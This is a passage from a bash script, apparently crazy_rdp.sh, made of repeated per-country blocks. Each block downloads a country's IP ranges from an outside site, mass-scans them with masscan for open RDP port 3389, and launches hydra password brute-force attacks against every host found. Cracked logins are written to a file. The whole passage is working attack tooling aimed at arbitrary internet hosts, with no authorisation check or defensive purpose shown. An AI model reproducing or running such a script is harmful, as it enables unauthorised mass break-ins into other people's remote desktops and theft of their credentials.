read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "117" ]; then
curl http://ipdiapazon.16mb.com/Mauritius.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi



else
if [ $country = "118" ]; then
curl http://ipdiapazon.16mb.com/Mexico.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "119" ]; then
curl http://ipdiapazon.16mb.com/Micronesia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "120" ]; then
curl http://ipdiapazon.16mb.com/Moldova.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "121" ]; then
curl http://ipdiapazon.16mb.com/Monaco.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "122" ]; then
curl http://ipdiapazon.16mb.com/Mongolia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "123" ]; then
curl http://ipdiapazon.16mb.com/Morocco.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "124" ]; then
curl http://ipdiapazon.16mb.com/Mozambique.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "125" ]; then
curl http://ipdiapazon.16mb.com/Myanmar.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi



else
if [ $country = "126" ]; then
curl http://ipdiapazon.16mb.com/Namibia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "127" ]; then
curl http://ipdiapazon.16mb.com/Nauru.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "128" ]; then
curl http://ipdiapazon.16mb.com/Nepal.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "129" ]; then
curl http://ipdiapazon.16mb.com/Netherlands.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "130" ]; then
curl http://ipdiapazon.16mb.com/Netherlands_antilles.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"
